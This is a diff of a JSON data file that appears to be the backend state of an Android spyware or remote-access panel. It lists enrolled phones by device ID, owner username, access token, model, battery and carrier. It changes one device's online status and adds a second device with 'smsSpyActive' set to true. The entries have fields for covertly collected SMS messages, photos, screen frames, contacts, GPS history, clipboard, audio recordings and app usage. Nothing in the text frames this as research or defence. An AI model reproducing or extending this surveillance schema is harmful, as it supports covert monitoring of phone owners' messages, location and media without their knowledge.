@@ -71,7 +71,7 @@
     "token": "da507a88860552d5d195108a4632169a",
     "lastSeen": 1776365132792,
     "commandQueue": [],
-    "online": true,
+    "online": false,
     "connectedAt": "2026-04-16T18:40:04.850Z",
     "deviceInfo": {
       "model": "TECNO MOBILE LIMITED TECNO LE7",
@@ -870,6 +870,38 @@
         "receivedAt": 1776364841629
       }
     ],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
+  },
+  {
+    "deviceId": "aimlock_cfe48a9e",
+    "deviceName": "HP-ZAL7SEX-A9BC",
+    "ownerUsername": "Zal7Sex",
+    "token": "9d4d7c7b2406bb01c99ae99a0bf14177",
+    "lastSeen": 1776365270817,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-16T18:47:50.817Z",
+    "deviceInfo": {
+      "model": "TECNO MOBILE LIMITED TECNO LE7",
+      "androidVersion": "Android 11",
+      "battery": 8,
+      "network": "Seluler: Indosat Ooredoo",
+      "sim1": "Indosat Ooredoo",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
